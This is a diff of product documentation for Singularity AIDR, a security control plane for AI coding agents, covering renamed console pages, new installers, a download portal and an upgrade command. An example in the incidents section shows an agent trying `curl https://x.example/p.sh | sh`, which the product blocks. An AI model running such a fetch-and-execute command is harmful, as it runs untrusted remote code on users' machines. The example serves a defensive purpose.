@@ -20,18 +20,18 @@ Compose or Kubernetes, and air-gapped.
 1. [How the control plane fits](#1-how-the-control-plane-fits)
 2. [Dashboard: route map](#2-dashboard-route-map)
 3. [Dashboard features](#3-dashboard-features)
-   - [Onboarding (Connect)](#onboarding-connect)
+   - [Onboarding](#onboarding)
    - [Downloads center](#downloads-center)
    - [Dashboard overview](#dashboard-overview)
-   - [Events](#events)
-   - [Incidents and evidence chain](#incidents-and-evidence-chain)
+   - [Activity feed](#activity-feed)
+   - [Security incidents and evidence chain](#security-incidents-and-evidence-chain)
    - [Agents and agent detail](#agents-and-agent-detail)
    - [Discovery coverage](#discovery-coverage)
    - [AI Security Posture](#ai-security-posture)
    - [Team policy and runtime policy](#team-policy-and-runtime-policy)
    - [Staged policy rollout and rollback](#staged-policy-rollout-and-rollback)
    - [DLP policy editor](#dlp-policy-editor)
-   - [Browser Privacy](#browser-privacy)
+   - [Browser Guard page](#browser-guard-page)
    - [AI governance: asset register, intake, exceptions and change control](#ai-governance-asset-register-intake-exceptions-and-change-control)
    - [Governance scorecard, framework mapping and scheduled summary](#governance-scorecard-framework-mapping-and-scheduled-summary)
    - [AutoSecOps view and response playbooks](#autosecops-view-and-response-playbooks)
@@ -120,29 +120,38 @@ the session and redirects to `/login` if it has expired. An idle session also en
 locally after an inactivity timeout. The routes are declared in
 `packages/dashboard/src/main.tsx`:
 
+The navigation is grouped by task: **Overview**, **Protection**, **Approvals &
+incidents**, **Devices & downloads**, **Governance & compliance** and **Administration**.
+Each label is also the heading of the page it opens, and the console is available in
+English and Turkish (labels below: English / Turkish).
+
 | Route | Navigation label | What it is for | Section |
 | --- | --- | --- | --- |
-| `/onboarding` | Connect | Create a workspace, start a trial, choose a runtime, authorize a device | [Onboarding](#onboarding-connect) |
-| `/downloads` | Downloads | Download connectors with verified SHA-256 digests | [Downloads center](#downloads-center) |
-| `/dashboard` | Dashboard | Fleet counters, live agents, recent events | [Dashboard overview](#dashboard-overview) |
-| `/billing` | Billing | Current plan, admitted agents, plan change request, invoices | [Billing and plan](#billing-and-plan) |
-| `/api-keys` | API Keys | Tenant API keys and one-time enrollment tokens | [API keys](#api-keys-and-enrollment-tokens) |
-| `/agents`, `/agents/:agentId` | Agents | Enrolled installations, seat usage, per-agent events | [Agents](#agents-and-agent-detail) |
-| `/events` | Events | Latest 500 reported verdict events | [Events](#events) |
-| `/discovery` | Discovery | Reported AI-infrastructure collectors and targets | [Discovery coverage](#discovery-coverage) |
-| `/posture` | Posture | Infrastructure CVEs, MCP risks, skill findings | [AI Security Posture](#ai-security-posture) |
-| `/incidents` | Incidents | Blocked and approval-required verdicts, evidence chain | [Incidents](#incidents-and-evidence-chain) |
-| `/approvals` | Approvals (pending-count badge for owners and admins) | Decide managed-mode `ask` requests with a reason | [Dashboard approvals](01-ai-agent-security.md#dashboard-approvals) |
-| `/privacy-guard` | Browser Privacy | Browser Guard counts and browser enrollment | [Browser Privacy](#browser-privacy) |
-| `/autosecops` | AutoSecOps | Runtime fleet view from the AutoSecOps integration | [AutoSecOps](#autosecops-view-and-response-playbooks) |
-| `/settings` | Settings | Workspace name, retention, closure, alert notifications, MFA status, theme | [Workspace settings](#workspace-settings-name-retention-closure), [Alert integrations](#alert-integrations-slack-teams-signed-webhooks-and-e-mail) |
-| `/team` | Team | Members, roles, invitations, team audit and export | [Team](#team-roles-and-invitations) |
-| `/scim` | Directory provisioning (owners only) | SCIM credentials and group-to-role mappings | [SCIM](#scim-directory-provisioning) |
-| `/policies` | Policies (roles that can edit policy) | Team policy, runtime policy, rollout, DLP editor | [Policies](#team-policy-and-runtime-policy) |
-| `/compliance` | Compliance (owners and admins) | Compliance evidence report (hash-sealed, optionally signed): JSON, CSV bundle, printable EN/TR | [Compliance evidence report](#compliance-evidence-report) |
-| `/governance` | Governance (owners and admins) | Governance scorecard, framework control matrix, scheduled summary settings | [Governance scorecard](#governance-scorecard-framework-mapping-and-scheduled-summary) |
-| `/governance/register` | AI register | AI asset register | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
-| `/governance/requests`, `/governance/change-control` | (from the AI register) | Intake requests and exceptions; four-eyes policy change control | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
+| `/dashboard` | Overview → Dashboard / Genel durum | Fleet counters, live agents, recent events | [Dashboard overview](#dashboard-overview) |
+| `/events` | Overview → Activity feed / Etkinlik akışı | Latest 500 reported verdict events | [Activity feed](#activity-feed) |
+| `/discovery` | Overview → Discovery / Keşif | Reported AI-infrastructure collectors and targets | [Discovery coverage](#discovery-coverage) |
+| `/posture` | Overview → Security posture / Güvenlik durumu | Infrastructure CVEs, MCP risks, skill findings | [AI Security Posture](#ai-security-posture) |
+| `/policies` | Protection → Team policy / Ekip politikası (roles that can edit policy) | Team policy, runtime policy, rollout, DLP editor | [Policies](#team-policy-and-runtime-policy) |
+| `/governance/detection-exceptions` | Protection → Detection exceptions / Tespit istisnaları (owners and admins) | Time-limited detection exceptions | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
+| `/privacy-guard` | Protection → Browser Guard | Browser Guard counts, Shadow AI, native NER and browser enrollment | [Browser Guard](#browser-guard-page) |
+| `/autosecops` | Protection → AutoSecOps | Runtime fleet view from the AutoSecOps integration | [AutoSecOps](#autosecops-view-and-response-playbooks) |
+| `/approvals` | Approvals & incidents → Approvals / Onaylar (pending-count badge for owners and admins) | Decide managed-mode `ask` requests with a reason | [Dashboard approvals](01-ai-agent-security.md#dashboard-approvals) |
+| `/incidents` | Approvals & incidents → Security incidents / Güvenlik vakaları | Blocked and approval-required verdicts, evidence chain | [Incidents](#security-incidents-and-evidence-chain) |
+| `/onboarding` | Devices & downloads → Onboarding / İlk kurulum | Create a workspace, start a trial, choose a runtime, authorize a device | [Onboarding](#onboarding) |
+| `/downloads` | Devices & downloads → Downloads / İndirmeler | Windows and Linux installers, connectors and Browser Guard, with verified SHA-256 digests | [Downloads center](#downloads-center) |
+| `/agents`, `/agents/:agentId` | Devices & downloads → Agents / Yapay zekâ araçları | Enrolled installations, seat usage, per-agent events | [Agents](#agents-and-agent-detail) |
+| `/api-keys` | Devices & downloads → API keys / API anahtarları | Tenant API keys and one-time enrollment tokens | [API keys](#api-keys-and-enrollment-tokens) |
+| `/governance` | Governance & compliance → AI governance / Yapay zekâ yönetişimi (owners and admins) | Governance scorecard, framework control matrix, scheduled summary settings | [Governance scorecard](#governance-scorecard-framework-mapping-and-scheduled-summary) |
+| `/governance/register` | Governance & compliance → AI asset register / Yapay zekâ varlık envanteri | AI asset register | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
+| `/governance/requests`, `/governance/change-control` | (from the AI asset register) | Intake requests and exceptions; four-eyes policy change control | [AI governance](#ai-governance-asset-register-intake-exceptions-and-change-control) |
+| `/compliance` | Governance & compliance → Compliance report / Uyum raporu (owners and admins) | Compliance evidence report (hash-sealed, optionally signed): JSON, CSV bundle, printable EN/TR | [Compliance evidence report](#compliance-evidence-report) |
+| `/team` | Administration → Team / Ekip | Members, roles, invitations, team audit and export | [Team](#team-roles-and-invitations) |
+| `/settings` | Administration → Settings / Ayarlar | Workspace name, retention, closure, alert notifications, MFA status, theme | [Workspace settings](#workspace-settings-name-retention-closure), [Alert integrations](#alert-integrations-slack-teams-signed-webhooks-and-e-mail) |
+| `/billing` | Administration → Billing / Faturalandırma | Current plan, admitted agents, plan change request, invoices | [Billing and plan](#billing-and-plan) |
+| `/sso` | Administration → Single sign-on / Çoklu oturum açma (SSO) (owners only) | Microsoft Entra ID and SAML 2.0 sign-in | [Single sign-on](#single-sign-on-microsoft-entra-id-and-saml-20) |
+| `/scim` | Administration → Directory provisioning / Dizin senkronizasyonu (owners only) | SCIM credentials and group-to-role mappings | [SCIM](#scim-directory-provisioning) |
+| `/retention` | Administration → Legal holds and retention / Yasal saklama ve veri saklama (owners and admins) | Legal holds and retention | [Retention](#9-retention-legal-hold-and-offboarding) |
+| `/siem` | Administration → SIEM export / SIEM aktarımı (roles that can edit policy) | SIEM delivery settings | [SIEM delivery](#siem-delivery) |
 | `/enterprise` | none (link in the invitation) | Invitation acceptance | [Team](#team-roles-and-invitations) |
 | `/auth/dlp-step-up` | none | MFA step-up before DLP and workspace changes | [MFA](#multi-factor-authentication-recovery-and-session-revocation) |
 | `/auth/recover` | none | Password recovery and break-glass recovery codes | [MFA](#multi-factor-authentication-recovery-and-session-revocation) |
@@ -157,11 +166,14 @@ anil@singularityrd.com instead of prices), `/pilot` (pilot application), `/verif
 
 ## 3. Dashboard features
 
-### Onboarding (Connect)
+### Onboarding
 
 **What it does.** `/onboarding` walks a new owner through a first protected agent. You
-create a team workspace, start the 14-day trial where it is offered, then complete three
-steps: **1) Choose runtime**, **2) Download & connect**, **3) Authorize**.
+create a team workspace and start the 14-day trial where it is offered. The recommended
+step is **1) Download and run the installer**: one Windows or Linux installer protects
+every supported AI tool on the computer. **Advanced: manual setup and device
+authorization** keeps the per-connector path in three steps: **1) Choose your AI tool**,
+**2) Download & connect**, **3) Authorize**.
 
 **Why it matters.** Most failed rollouts stall between "installed" and "reporting". This
 page pairs the right connector download with a device code for the same team, so the
@@ -174,11 +186,14 @@ step 3 you can create a device code (`device-start`) or a manual enrollment toke
 page is disabled for roles that cannot enroll agents.
 
 **How to use.**
-1. Sign in and open **Connect** (`/onboarding`).
+1. Sign in and open **Onboarding** (`/onboarding`, under **Devices & downloads**).
 2. If you have no workspace yet, enter a name under **Create your team workspace**.
 3. If offered, tick the Terms and Privacy acknowledgement (the versions your operator
    recorded) and press **Start 14-day trial · 1 agent**.
-4. Pick the runtime, download and verify the installer, and install it.
+4. Download the installer, check its SHA-256 and run it; restart your AI tools. For a
+   single connector instead, open the advanced section, pick the AI tool, download and
+   verify its package and install it. A manual install also needs the release key once:
+   `aidr setup --release-key <key.pem>` (the installer does this itself).
 5. When the agent prints a code, approve it on `/verify`. Generate a code here only if
    you need a manual enrollment token.
 
@@ -193,30 +208,45 @@ appears on `/agents` with runtime `codex`.
 | All plans (catalog feature `dashboard`). The trial is cloud only. | Cloud, On-prem, Air-gapped | Web console in a current browser; connectors per their own guides |
 
 **Limitations.** The trial button appears only in `cloud` admission mode, only to
-owners, and only if the user has not used a trial before. Connector installation itself
-is still a per-runtime step, and a universal MDM installer is not shipped.
+owners, and only if the user has not used a trial before. Installers are offered for
+Windows and Linux only; macOS uses the per-connector packages. Codex hooks still need
+`/hooks` trust in Codex, and Cursor and VS Code need "Singularity AIDR: Enable
+protection"; `aidr status` names any such step.
 
 ### Downloads center
 
-**What it does.** `/downloads` lists the connector packages of the published release:
-Claude Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, the AIDR CLI, Browser Guard
-for Chrome and Edge, Browser Guard for Firefox, and the MCP gateway. Each entry shows
-its file name, size and SHA-256 digest, and marks the runtime as detected once one of
-its agents has checked in.
+**What it does.** `/downloads` (**Downloads**) is the download portal. It detects the
+visitor's operating system and offers the matching **Windows or Linux installer** (MSI,
+`.deb`, `.rpm`, tarball) first, with size, SHA-256 and a copyable checksum command, and
+lists the other platforms. macOS visitors see that no macOS installer is offered and that
+Browser Guard works on macOS. Below are the Browser Guard store links (**Add to
+Chrome**, **Add to Edge**, **Add to Firefox**) with the extension IDs for IT policy, an
+**IT / MDM deployment** card, and **Individual connector packages (advanced)**: Claude
+Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, the AIDR CLI, Browser Guard for
+Chrome and Edge, Browser Guard for Firefox and the MCP gateway, each with its file name,
+size and SHA-256 digest, marked as detected once one of its agents has checked in.
 
 **Why it matters.** A tampered installer can defeat a security product before it
 starts. The center gives administrators the exact digest and copy-paste verification
 commands, and it shows nothing it cannot verify.
 
-**How it works.** The console loads a release manifest, either from the dashboard
-server (`AIDR_RELEASE_MANIFEST_PATH`) or from an external HTTPS URL
+**How it works.** Installers come from the `installer-download` Edge Function: it
+requires a signed-in active member of a tenant with an active licence, trial or pilot,
+verifies the signed installer catalog, writes an `installer.download` audit row and only
+then returns a short-lived signed URL; a catalog that fails its signature check offers
+nothing. Enrolled endpoints reach the same signed catalog through `installer-update` for
+`aidr update`. The advanced connector list loads a release manifest, either from the
+dashboard server (`AIDR_RELEASE_MANIFEST_PATH`) or from an external HTTPS URL
 (`VITE_AIDR_RELEASE_MANIFEST_URL`). It validates the manifest in the browser as well:
 an `http:` link, a missing digest, an unknown field or a manifest over 1 MiB rejects it.
-If a detached signature is published, it links to it.
+If a detached signature is published, it links to it. Operator details:
+[download-portal.md](../../../installation/download-portal.md).
 
-**How to use.** Open **Downloads**, pick a runtime, download the file and run the shown
-command under **Verify the download before installing**. Do not install if the check
-fails.
+**How to use.** Open **Downloads**, download the installer recommended for the computer,
+run the checksum command (it prints `True` on Windows or `OK` on Linux) and run the
+installer; then restart the AI tools. For a single connector package, open the advanced
+section and run the command under **Verify the download before installing**. Do not
+install if a check fails.
 
 **Example.** The Firefox entry shows `SHA-256 3f…`. The administrator runs the listed
 `sha256sum` command, the digests match, and the file is pushed through browser policy.
@@ -227,12 +257,14 @@ not an HTTPS or same-origin address, so downloads are withheld."
 
 | Plan | Deployment | Platforms / OS |
 | --- | --- | --- |
-| All plans | Cloud, On-prem, Air-gapped (manifest served by your own dashboard server) | Web console; downloads for Windows, macOS and Linux per connector |
+| All plans (installer downloads need an active licence, trial or pilot) | Cloud, On-prem, Air-gapped (catalog and manifest served by your own control plane) | Web console; installers for Windows and Linux (x64, arm64 where published); connector packages per connector |
 
-**Limitations.** A digest proves integrity against the manifest, not publisher
-identity. Notarization, code signing and MDM acceptance remain external steps. If no
-manifest is configured, the page shows "No verified download is available for this
-deployment."
+**Limitations.** A digest proves integrity against the catalog or manifest, not
+publisher identity; the installers themselves are Authenticode- or GPG-signed. MDM
+acceptance remains an external step. No macOS installer is offered. Until an operator
+publishes installers the page says "No installer has been published for this deployment
+yet. Ask your release operator."; if no connector manifest is configured, the advanced
+list shows "No verified download is available for this deployment."
 
 ### Dashboard overview
 
@@ -252,7 +284,7 @@ that way. "Latest heartbeat" is the newest `last_seen` of any agent.
 **Verify code** to approve a device code.
 
 **Example.** After a policy change the **Deny** tile rises from 3 to 41 within the
-latest 500 events. The reviewer opens **Events** to see which tool was blocked.
+latest 500 events. The reviewer opens **Activity feed** to see which tool was blocked.
 
 **Availability.**
 
@@ -264,7 +296,7 @@ latest 500 events. The reviewer opens **Events** to see which tool was blocked.
 history. `allow` verdicts appear only if endpoints send clean verdicts
 (`control_plane.send_clean_verdicts: true`).
 
-### Events
+### Activity feed
 
 **What it does.** `/events` lists the latest 500 events from the team's agents with
 time, agent, type, verdict and summary. Badges total the deny, ask and allow verdicts.
@@ -278,7 +310,7 @@ reporting, `ask` and `deny` are uploaded. `allow` needs clean-verdict reporting.
 show only fields that survived redaction. With the default `redact_mode: "hash"`,
 command and URL text is replaced by SHA-256 digests.
 
-**How to use.** Open **Events** and press **Refresh**. To also collect `allow` verdicts,
+**How to use.** Open **Activity feed** and press **Refresh**. To also collect `allow` verdicts,
 set `control_plane.send_clean_verdicts` to `true` in the endpoint configuration.
 
 **Example.** A row reads `runtime_verdict` · `deny` · `Bash: deny` for agent
@@ -294,7 +326,7 @@ set `control_plane.send_clean_verdicts` to `true` in the endpoint configuration.
 or SIEM delivery for longer history. Event visibility depends on endpoint reporting
 settings.
 
-### Incidents and evidence chain
+### Security incidents and evidence chain
 
 **What it does.** `/incidents` shows possible incidents derived from received blocked
 (`deny`) and approval-required (`ask`) verdicts, plus plugin scan findings. Below the
@@ -311,10 +343,11 @@ Clock skew that no record reported is shown as *not reported*, never as in sync.
 chain head counts as `anchored` only when an archive returned proof for that digest.
 Without a configured archive sink it says `unanchored` (`no_archive_sink`).
 
-**How to use.** Open **Incidents**, review the blocked and approval-required counts,
+**How to use.** Open **Security incidents**, review the blocked and approval-required counts,
 and expand an evidence group for the device and correlation id you are investigating.
-Approvals for `ask` happen out of band with the operator CLI (`aidr pending`,
-`aidr approve <actionId>`), never from the console or the agent.
+This page has no approve control. A person approves an `ask` in their own terminal
+(`aidr pending`, then `aidr approve <first 8 characters of the id>`) or, in managed mode,
+on the **Approvals** page; never the agent.
 
 **Example.** An agent tries `curl https://x.example/p.sh | sh`. The endpoint blocks it
 and reports `deny`. The incident list shows "1 blocked", and the evidence chain shows
@@ -481,7 +514,7 @@ are `command_default`, `file_default`, `url_default`, `package_default`,
 corresponding `*_tools` lists. Stale writes return `409`. Connectors fetch the published
 controls on their next refresh and report a load receipt.
 
-**How to use.** Open **Policies**. Owners, admins and members can write and save YAML
+**How to use.** Open **Team policy**. Owners, admins and members can write and save YAML
 drafts. Owners and admins then run **Compile saved YAML (dry run)**, review the result,
 and press **Compile and publish saved YAML** or **Publish runtime policy JSON**.
 
@@ -568,7 +601,7 @@ saved revision separately. Current connector hooks inspect tool **input** before
 execution only. Output-direction rules are not enforced there, and a `redact` match is
 blocked rather than rewritten.
 
-### Browser Privacy
+### Browser Guard page
 
 **What it does.** `/privacy-guard` reports what Browser Guard masked, warned about or
 blocked before it reached AI chat products, over 7 or 30 days. The tiles are **Prompts
@@ -586,10 +619,16 @@ policy id and the timestamp. Anything else is discarded. The page reads aggregat
 `public.privacy_guard_summary(tenant, 7 | 30)` under row-level security.
 
 **How to use.**
-1. Deploy the Browser Guard package to Chrome, Edge or Firefox.
-2. Create a write-capable tenant API key on **API Keys**.
-3. On **Browser Privacy → Enroll browsers**, choose the guard mode (`auto`, `confirm`,
-   `block` or `monitor`), copy the policy JSON, replace the `apiKey` placeholder and push
+1. Deploy Browser Guard to Chrome, Edge or Firefox: from the unlisted Chrome Web Store and
+   Edge Add-ons listings (store links and extension IDs on **Downloads**; the stores keep
+   it updated), or, for networks without store access, as the self-hosted package from
+   your own HTTPS update feed; Firefox uses the Mozilla-signed XPI. See
+   [Deploying Browser Guard in an organisation](../../../installation/browser-guard-enterprise.md).
+2. Create a write-capable tenant API key on **API keys**.
+3. On **Browser Guard → Enroll browsers**, choose the guard mode (`auto`, `confirm`,
+   `block` or `monitor`; in the console **Auto-mask**, **Confirm**, **Block**,
+   **Monitor**, in Turkish **Otomatik maskele**, **Bana sor**, **Engelle**, **Yalnızca
+   say (maskeleme yok)**), copy the policy JSON, replace the `apiKey` placeholder and push
    it through your browser management tool. Samples are in
    [deploy/browser-guard](../../../../deploy/browser-guard/README.md).
 
@@ -611,7 +650,7 @@ Privacy scans are not part of the audit export.
 
 **What it does.** Records which AI systems are in use, who owns them and why, who may use
 which AI and who approved it, which exceptions are in force until when, and who changed
-security policy with whose approval. Pages: **AI register** (`/governance/register`),
+security policy with whose approval. Pages: **AI asset register** (`/governance/register`),
 **Requests & exceptions** (`/governance/requests`) and **Change control**
 (`/governance/change-control`).
 
@@ -647,7 +686,7 @@ record that also drives enforcement where it can.
 - Every change needs multi-factor verification and is written to the audit log in the same
   transaction.
 
-**How to use.** Open **AI register**, choose **Import observed AI systems**, then assign
+**How to use.** Open **AI asset register**, choose **Import observed AI systems**, then assign
 owners and review dates. Turn on four-eyes on **Change control** (needs two active
 owners or admins). Details: [ai-governance.md](../../../ai-governance.md).
 
@@ -669,7 +708,7 @@ is a record-keeping and control tool, not a statement of legal compliance.
 
 ### Governance scorecard, framework mapping and scheduled summary
 
-**What it does.** **Governance** (`/governance`, owners and admins) shows a scorecard for a
+**What it does.** **AI governance** (`/governance`, owners and admins) shows a scorecard for a
 7, 30 or 90-day window: top risks, framework coverage, AI usage, agent decisions, human
 oversight, incidents and posture, Browser Guard and acceptable-use coverage, policy
 freshness, and a control matrix for NIST AI RMF, ISO/IEC 42001, the EU AI Act and
@@ -694,7 +733,7 @@ AI use and of the controls in place, without reading raw events.
 - *Print / save as PDF* produces a self-contained A4 edition; signed evidence remains the
   [compliance evidence report](#compliance-evidence-report).
 
-**How to use.** Open **Governance**, pick a window, and enable the summary under
+**How to use.** Open **AI governance**, pick a window, and enable the summary under
 **Scheduled summary**. Details: [ai-governance-frameworks.md](../../../ai-governance-frameworks.md).
 
 **Example.** The 30-day scorecard shows 42 approval requests, a median decision time of four
@@ -1110,7 +1149,7 @@ order governs):
 | Purchase | Sign up | Self-serve card when enabled, otherwise invoice | Sales-assisted, invoice | Sales-assisted, invoice |
 | Local detection engine (`local_detection`) | Yes | Yes | Yes | Yes |
 | Control-plane dashboard (`dashboard`), including events, incidents, agents, policies, DLP editor, API keys, team, settings, billing | Yes | Yes | Yes | Yes |
-| Browser Privacy Guard (`browser_privacy_guard`) | - | Yes | Yes | Yes |
+| Browser Guard (`browser_privacy_guard`) | - | Yes | Yes | Yes |
 | Microsoft Entra ID SSO (`entra_sso`) | - | Yes | Yes | Yes |
 | SIEM export (`siem_export`) | - | - | Yes | Yes |
 | SCIM provisioning (`scim`) | - | - | Yes | Yes |
@@ -1152,7 +1191,7 @@ acceptance of the current Terms and Privacy versions, and a user who has never h
 trial. The trial claim in Auth metadata is immutable. Ingest and enrollment check
 `tenant_admission_capacity`. A tenant with no admitted capacity rejects new agents.
 
-**How to use.** Cloud customers start the trial on **Connect**. Paid terms arrive
+**How to use.** Cloud customers start the trial on **Onboarding**. Paid terms arrive
 through the paths below. The Billing page shows admission status and term end.
 
 **Example.** On day 15 of a trial, admission ends. New enrollments and event ingest are
@@ -1370,7 +1409,7 @@ request signing. "Delivered" does not prove indexing or alerting downstream.
 ### Compliance evidence report
 
 **What it does.** Owners and admins generate a tenant-scoped JSON report for a chosen
-period (up to 366 days) from **Compliance** (`/compliance`) or the `compliance-report`
+period (up to 366 days) from **Compliance report** (`/compliance`) or the `compliance-report`
 API. It gathers the evidence security and DPO teams are usually asked for: tenant
 profile and retention settings, protection coverage by runtime, Browser Guard
 masked/warned/blocked counts by entity type, AI site and day, agent DLP decisions,
@@ -1391,7 +1430,7 @@ signing key, an Ed25519 signature. Each issued report is written to the admin au
 session, passes the identity barrier, is rate limited (3 per minute per user) and fails
 closed at every step.
 
-**How to use.** Open **Compliance**, pick a period and press **Generate report**. Then
+**How to use.** Open **Compliance report**, pick a period and press **Generate report**. Then
 download the JSON (the authoritative artifact), a ZIP of CSV files (one per section
 table), or a printable report in English or Turkish (**Print / save as PDF**). Auditors
 verify the JSON offline:
@@ -1625,7 +1664,12 @@ to a server, and it keeps working if the control plane or licence goes away.
 operator approvals (`aidr pending`, `aidr approve`) all live on the endpoint under
 `~/.singularity-aidr/`.
 
-**How to use.** Install a connector and run `aidr setup`. See
+**How to use.** On Windows and Linux run the desktop installer: it sets AIDR up for
+the user (`aidr setup`) and provisions the release key. Otherwise install a connector
+package and run `aidr setup --release-key <file.pem>` (sets up the release key and
+configures AIDR in one run). Check with
+`aidr status` and `aidr verify`. Installer endpoints update with `aidr update`. See
+[Desktop installers](../../../installation/desktop-installers.md) and
 [configuration.md](../../../configuration.md).
 
 **Example.** A contractor laptop with no corporate network still blocks
@@ -1655,8 +1699,11 @@ EU, US and APAC regions, recorded as declarations in
 becomes available when its hosted project, residency terms and subprocessor list are
 approved.
 
-**How to use.** Sign up where signup is open, start the trial, enroll endpoints, deploy
-connectors and Browser Guard, then publish policy. See
+**How to use.** Sign up where signup is open, start the trial, download the Windows or
+Linux installer from **Downloads** (or deploy it with Intune, SCCM, GPO or your Linux
+package repository), enroll endpoints, deploy Browser Guard from the browser stores,
+then publish policy. Enrolled installer endpoints receive updates from the same portal
+through `aidr update`. See
 [saas.md](../../../deployment/saas.md).
 
 **Example.** A 10-developer team starts a trial, enrolls one agent, then requests Team
@@ -1918,9 +1965,14 @@ expiry. The `AIDRCertificateExpiresSoon` alert helps.
 
 ### Upgrade and rollback
 
-**What it does.** For Compose, `scripts/deployment-upgrade.mjs` handles upgrades with
-the `preflight`, `apply`, `resume` and `recover` commands, and is **signal-safe**. For
-Helm, a `helm upgrade` runs migrations as a `pre-upgrade` hook.
+**What it does.** For Compose, one command upgrades the installation:
+`pnpm onprem:upgrade --to <new release directory>` (`scripts/onprem-upgrade.mjs`) runs
+check, encrypted backup, backup verification, preflight, apply, restart, the online
+doctor and read-only post-upgrade checks, stops at the first failed step, and prints the
+exact recovery step in English or Turkish. Underneath, `scripts/deployment-upgrade.mjs`
+handles the `preflight`, `apply`, `resume` and `recover` commands and is
+**signal-safe**. For Helm, a `helm upgrade` runs migrations as a `pre-upgrade` hook.
+Endpoints keep enforcing locally during the upgrade.
 
 **Why it matters.** An interrupted upgrade that leaves the schema half-applied is the
 worst outage a control plane can have.
@@ -1935,7 +1987,14 @@ schema commit it restarts the services that were running; after it, it keeps the
 drained. It records the resumable phase and exits `130` or `143`. Every failed apply
 writes a rollback plan.
 
-**How to use.**
+**How to use.** Prepare the new release in its own directory, then in a maintenance
+window:
+```sh
+pnpm onprem:upgrade --to /srv/aidr-target --dry-run   # shows the plan, changes nothing
+pnpm onprem:upgrade --to /srv/aidr-target             # runs it
+pnpm onprem:upgrade --to /srv/aidr-target --resume    # continues an interrupted upgrade
+```
+The individual steps remain available:
 ```sh
 node scripts/deployment-upgrade.mjs preflight --current /srv/aidr --target /srv/aidr-target \
   --backup /backups/aidr-pre-upgrade --key-file /secure/aidr-recovery.key \
@@ -1944,6 +2003,8 @@ node scripts/deployment-upgrade.mjs apply ... --maintenance     # same options
 node scripts/deployment-upgrade.mjs resume ... --maintenance    # after an interruption
 ```
 Never rerun preparation over `/srv/aidr`. Prepare the new release in a new directory.
+Step by step, including the Helm and air-gapped paths:
+[Upgrading an on-prem installation](../../../operations/onprem-upgrade.md).
 
 **Example.** A change window ends early and the operator sends one `SIGTERM` during the
 file install. The tool finishes that step, records `interrupted_by`, exits `143`, and the
@@ -1994,7 +2055,7 @@ the daily average. Replace these assumptions with real customer data:
 | Device-code enrollment | - | Yes | Yes (with signer) | Signer not in chart; use enrollment tokens or add it | Yes (with signer) |
 | API keys and enrollment tokens | - | Yes | Yes | Yes | Yes |
 | Runtime policy, rollout, DLP editor | Local policy file only | Yes | Yes | Yes | Yes |
-| Browser Privacy reporting | Extension masks locally, no report | Yes | Yes | Yes | Yes |
+| Browser Guard reporting | Extension masks locally, no report | Yes | Yes | Yes | Yes |
 | AI Security Posture page | Scanners run locally, no page | Yes | Yes | Yes | Yes (internal targets) |
 | Dashboard approvals, AI register, change control, governance scorecard | Terminal approvals only | Yes | Yes | Yes | Yes |
 | Deep-scan sidecar | Optional loopback bridge | Not listed for the hosted service | Optional `--with-posture-scanner` | Optional `postureScanner.enabled` | Optional; remote scans only via egress allowlist |
